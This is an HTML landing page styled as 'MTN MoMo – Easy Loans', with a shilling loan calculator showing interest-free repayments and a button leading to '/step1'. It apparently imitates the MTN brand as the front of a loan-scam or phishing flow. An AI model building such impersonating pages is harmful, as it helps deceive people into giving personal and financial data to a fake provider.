<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>MTN MoMo – Easy Loans</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
<style>
  :root {
    --mtn-dark: #003366;
    --mtn-gold: #FFD700;
    --mtn-light: #004080;
    --grad: linear-gradient(to right, #003366, #004080);
    --page-bg: #F5F5F5;
    --white: #FFFFFF;
    --text-dark: #1C2340;
    --text-mid: #444;
    --text-light: #888;
    --border: #ddd;
    --radius: 12px;
    --radius-sm: 8px;
  }
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { font-family: 'Inter', sans-serif; background: var(--page-bg); color: var(--text-dark); min-height: 100vh; }

  /* MTN MOMO LOGO */
  .mtn-logo { display: flex; flex-direction: column; align-items: center; gap: 4px; }
  .mtn-logo-icon { width: 45px; height: 45px; background: var(--mtn-gold); border-radius: 8px; display: flex; align-items: center; justify-content: center; font-size: 1.8rem; font-weight: 900; color: var(--mtn-dark); position: relative; }
  .mtn-logo-icon::after { content: 'M'; font-size: 2rem; font-weight: 900; }
  .mtn-logo-text { font-size: 1rem; font-weight: 700; color: var(--mtn-dark); }
  .mtn-logo-sub { font-size: 0.65rem; color: #888; font-weight: 500; }

  /* PAGE SYSTEM */
  .page { display: none; min-height: 100vh; animation: fadeIn 0.3s ease; }
  .page.active { display: flex; flex-direction: column; }
  @keyframes fadeIn { from{opacity:0;transform:translateY(8px)} to{opacity:1;transform:translateY(0)} }

  /* NAV */
  .navbar { background: var(--mtn-dark); display:flex; align-items:center; justify-content:center; padding:0 20px; height:54px; position:relative; flex-shrink:0; }
  .nav-left { position:absolute; left:20px; color:rgba(255,255,255,0.6); font-size:0.84rem; cursor:pointer; text-decoration:none; transition:color 0.2s; }
  .nav-left:hover { color:#fff; }
  .nav-right { position:absolute; right:20px; display:flex; flex-direction:column; gap:4px; cursor:pointer; padding:4px; }
  .hline { width:20px; height:2px; background:rgba(255,255,255,0.6); border-radius:1px; }

  /* BUTTONS */
  .btn-grad { background: var(--grad); color:#fff; border:none; border-radius:8px; padding:14px 20px; font-size:0.88rem; font-weight:600; letter-spacing:0.05em; cursor:pointer; width:100%; font-family:'Inter',sans-serif; transition:opacity 0.2s; }
  .btn-grad:hover { opacity:0.9; }
  .btn-grad:disabled { opacity:0.5; cursor:not-allowed; }
  .btn-gray { background:#e0e0e0; color:#666; border:none; border-radius:8px; padding:14px 20px; font-size:0.88rem; font-weight:600; letter-spacing:0.05em; cursor:pointer; flex:1; font-family:'Inter',sans-serif; transition:background 0.2s; }
  .btn-gray:hover { background:#d0d0d0; }

  /* ───── PAGE 1: LANDING ───── */
  #page-landing { background:var(--page-bg); }
  .land-nav { background: var(--mtn-dark); display:flex; align-items:center; justify-content:space-between; padding:0 24px; height:52px; flex-shrink:0; }
  .land-nav .hbg { display:flex; flex-direction:column; gap:4px; cursor:pointer; }
  .land-nav .hbg span { width:20px; height:2px; background:rgba(255,255,255,0.7); border-radius:1px; display:block; }
  .land-center { flex:1; display:flex; align-items:center; justify-content:center; padding:32px 16px; }
  .land-card { width:100%; max-width:520px; background:#fff; border-radius:var(--radius); box-shadow:0 4px 24px rgba(0,0,0,0.1); padding:36px 32px; }
  .land-card h1 { font-size:1.45rem; font-weight:700; text-align:center; margin-bottom:6px; }
  .land-tagline { text-align:center; font-size:0.84rem; color:var(--text-light); margin-bottom:28px; }
  .calc-box { background:#fafafa; border:1px solid #eee; border-radius:var(--radius-sm); padding:20px; margin-bottom:22px; }
  .calc-box h2 { font-size:0.92rem; font-weight:600; margin-bottom:16px; }
  .calc-row2 { display:flex; justify-content:space-between; font-size:0.81rem; color:var(--text-mid); margin-bottom:6px; }
  .calc-row2 .cv { color:var(--mtn-gold); font-weight:600; }
  input[type=range] { width:100%; -webkit-appearance:none; height:5px; border-radius:3px; outline:none; cursor:pointer; margin-bottom:4px; background:linear-gradient(to right,var(--mtn-gold) 0%,var(--mtn-gold) var(--pct,10%),#ddd var(--pct,10%),#ddd 100%); }
  input[type=range]::-webkit-slider-thumb { -webkit-appearance:none; width:18px; height:18px; border-radius:50%; background:var(--mtn-gold); border:3px solid #fff; box-shadow:0 2px 6px rgba(255,215,0,0.5); cursor:pointer; }
  .range-ends { display:flex; justify-content:space-between; font-size:0.72rem; color:var(--text-light); margin-bottom:14px; }
  .monthly-box { background:#fff; border:1px solid #eee; border-radius:var(--radius-sm); padding:14px 16px; display:flex; justify-content:space-between; align-items:center; }
  .monthly-box .ml { font-size:0.82rem; color:var(--text-light); }
  .monthly-box .ma { font-size:1.5rem; font-weight:700; color:var(--mtn-gold); }
  .feats-row { display:flex; justify-content:space-around; padding:20px 0 0; border-top:1px solid #f0f0f0; margin-top:4px; }
  .feat { text-align:center; }
  .feat .fi { font-size:1.6rem; margin-bottom:5px; }
  .feat .ft { font-size:0.8rem; font-weight:600; }
  .feat .fs { font-size:0.73rem; color:var(--text-light); }
  .land-footer { background: var(--mtn-dark); padding:14px; text-align:center; font-size:0.77rem; color:rgba(255,255,255,0.45); flex-shrink:0; }
</style>
</head>
<body>

<!-- ══════════════════════ PAGE 1: LANDING ══════════════════════ -->
<div id="page-landing" class="page active">
  <div class="land-nav">
    <div style="flex: 1;"></div>
    <div class="mtn-logo">
      <div class="mtn-logo-icon">M</div>
      <div class="mtn-logo-text">MoMo</div>
      <div class="mtn-logo-sub">from MTN</div>
    </div>
    <div style="flex: 1;"></div>
  </div>
  <div class="land-center">
    <div class="land-card">
      <h1>Welcome to MTN MoMo</h1>
      <p class="land-tagline">Get loans easily through MTN MoMo</p>
      <div class="calc-box">
        <h2>Loan Calculator</h2>
        <div class="calc-row2">
          <span>Amount</span>
          <span class="cv" id="calcAmt">UGX 500,000</span>
        </div>
        <div class="calc-row2">
          <span>Term</span>
          <span class="cv" id="calcTerm">48 Months</span>
        </div>
        <input type="range" id="amtSlider" min="500000" max="5000000" step="100000" value="1000000" oninput="updateCalc()">
        <div class="range-ends">
          <span>UGX 500,000</span>
          <span>UGX 5,000,000</span>
        </div>
        <div class="monthly-box">
          <span class="ml">Monthly Payment</span>
          <span class="ma" id="monthlyAmt">UGX 24,000</span>
        </div>
      </div>
      <button class="btn-grad" onclick="startApplication()">START APPLICATION</button>
    </div>
  </div>
  <div class="land-footer">© 2026 MTN MoMo Loans – Powered by MTN</div>
</div>

<script>
  // STATE
  const S = {
    loanType: '', loanAmount: 0, loanTerm: '', loanPurpose: '',
    firstName: '', lastName: '', phone: '',
    employment: '', annualIncome: 0,
    applicationId: '',
    isSubmitting: false
  };

  // NAVIGATION
  function goTo(pageId) {
    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    document.getElementById(pageId)?.classList.add('active');
    window.scrollTo(0, 0);
  }

  function startApplication() {
    window.location.href = '/step1';
  }

  // LANDING PAGE CALC
  function updateCalc() {
    const amt = +document.getElementById('amtSlider').value;
    document.getElementById('calcAmt').textContent = 'UGX ' + amt.toLocaleString();
    const monthly = Math.ceil(amt / 48);
    document.getElementById('monthlyAmt').textContent = 'UGX ' + monthly.toLocaleString();
  }

  // INIT
  updateCalc();
</script>
</body>
</html>
